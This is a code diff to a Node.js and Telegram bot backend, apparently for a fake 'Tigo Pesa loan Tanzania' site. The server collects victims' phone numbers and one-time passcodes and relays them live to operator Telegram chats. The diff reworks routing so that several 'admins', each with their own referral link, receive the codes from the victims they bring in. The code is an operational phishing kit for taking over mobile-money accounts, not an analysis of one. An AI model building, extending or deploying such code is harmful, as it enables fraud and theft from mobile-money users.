@@ -1,18 +1,16 @@
 /**
- * **MIXX BY YAS - INDEPENDENT & FLEXIBLE MULTI-ADMIN BACKEND SERVER**
+ * **MIXX BY YAS - STRICT ISOLATED MULTI-ADMIN BACKEND SERVER**
  */
 
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
-const fs = require('fs');
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || null;
 const APP_URL = process.env.APP_URL || null;
 const USE_WEBHOOK = String(process.env.USE_WEBHOOK || 'false').toLowerCase() === 'true';
 
@@ -25,40 +23,22 @@ const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TOKEN}`;
 let bot = null; 
 const sessions = new Map();
 
-const ADMIN_FILE = path.join(__dirname, 'admins.json');
-
-function loadAdminMapping() {
-  try {
-    if (fs.existsSync(ADMIN_FILE)) {
-      const data = fs.readFileSync(ADMIN_FILE, 'utf8');
-      return JSON.parse(data);
-    }
-  } catch (err) {
-    console.error('[Error] Failed to load admins.json:', err);
-  }
-  return {
-    "01": "8524294724" // Primary baseline fallback
-  };
-}
-
-function saveAdminMapping(mapping) {
-  try {
-    fs.writeFileSync(ADMIN_FILE, JSON.stringify(mapping, null, 2), 'utf8');
-  } catch (err) {
-    console.error('[Error] Failed to save admins.json:', err);
-  }
-}
-
-let ADMIN_MAPPING = loadAdminMapping();
-
 /**
- * **FLEXIBLE RESOLUTION WITH SAFE FALLBACK**
- * Allows independent link routing while safely falling back if an admin code is unmapped.
+ * **STRICT ENVIRONMENT-BASED RESOLUTION**
+ * Maps codes (01, 02, etc.) directly to environment variables to prevent fallback leaks.
  */
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return DEFAULT_CHAT_ID;
-  const lowerKey = String(adminKeyOrId).toLowerCase();
-  return ADMIN_MAPPING[lowerKey] || adminKeyOrId || DEFAULT_CHAT_ID;
+  if (!adminKeyOrId) return null;
+  const cleanKey = String(adminKeyOrId).toUpperCase().padStart(2, '0');
+  
+  // Look up from environment variables (e.g., process.env.ADMIN_01, process.env.ADMIN_02)
+  const envVarName = `ADMIN_${cleanKey}`;
+  if (process.env[envVarName]) {
+    return process.env[envVarName];
+  }
+  
+  // Fallback check if a raw chat ID was passed directly
+  return adminKeyOrId;
 }
 
 function isValidTigoNumber(phoneStr) {
@@ -119,26 +99,19 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    let adminCode = Object.keys(ADMIN_MAPPING).find(key => ADMIN_MAPPING[key] === chatId);
+    // Determine code based on matching environment variables
+    let assignedCode = '01';
+    if (chatId === process.env.ADMIN_02) assignedCode = '02';
+    else if (chatId === process.env.ADMIN_01) assignedCode = '01';
 
-    if (!adminCode) {
-      const existingKeys = Object.keys(ADMIN_MAPPING).filter(k => !isNaN(k));
-      const nextNum = existingKeys.length > 0 ? Math.max(...existingKeys.map(Number)) + 1 : 1;
-      adminCode = String(nextNum).padStart(2, '0');
-
-      ADMIN_MAPPING[adminCode] = chatId;
-      saveAdminMapping(ADMIN_MAPPING);
-      console.log(`[Admin] Registered new incoming admin: ${fullName} as code ${adminCode} (${chatId})`);
-    }
-
-    const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${adminCode}`;
+    const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
     const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
 
     const userWelcomeInfo = 
       `🚨 **Admin Link Registered Successfully!**\n\n` +
       `👤 **Name:** ${fullName}\n` +
       `🆔 **Chat ID:** \`${user.id}\`\n` +
-      `🔢 **Assigned Code:** \`${adminCode}\`\n` +
+      `🔢 **Assigned Code:** \`${assignedCode}\`\n` +
       `🏷 **Username:** ${username}\n\n` +
       `🔗 **Your Unique Application Link:**\n${cleanBrowseLink}\n\n` +
       `🔗 **Admin Dashboard Link:**\n${secureAdminLink}`;
@@ -162,7 +135,12 @@ async function initBot() {
         return;
       }
 
-      const chatTarget = session.adminChatId || DEFAULT_CHAT_ID;
+      const chatTarget = session.adminChatId;
+      if (!chatTarget) {
+        await bot.answerCallbackQuery(query.id, { text: '⚠️ Admin destination missing.' });
+        return;
+      }
+
       switch (prefix) {
         case 'ALLOW_OTP':
           session.status = 'APPROVED_LOAD_OTP';
@@ -221,7 +199,7 @@ app.post('/api/submit-application', (req, res) => {
 
     const targetChat = resolveAdminChatId(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'No admin chat ID configured' });
+      return res.status(400).json({ success: false, error: 'Invalid or unregistered admin identifier.' });
     }
 
     const userId = phone || `user_${Date.now()}`;
@@ -307,8 +285,10 @@ app.post('/api/submit-otp', (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
-    bot.sendMessage(targetChat, message, opts).catch(() => {});
+    const targetChat = session.adminChatId;
+    if (targetChat) {
+      bot.sendMessage(targetChat, message, opts).catch(() => {});
+    }
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -330,8 +310,10 @@ app.post('/api/request-new-otp', (req, res) => {
       `📱 *Tigo User:* +255 ${session.phone}\n` +
       `⚠️ The user's countdown expired and they requested a new OTP code.`;
 
-    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
-    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
+    const targetChat = session.adminChatId;
+    if (targetChat) {
+      bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
+    }
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -344,4 +326,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-        
+      
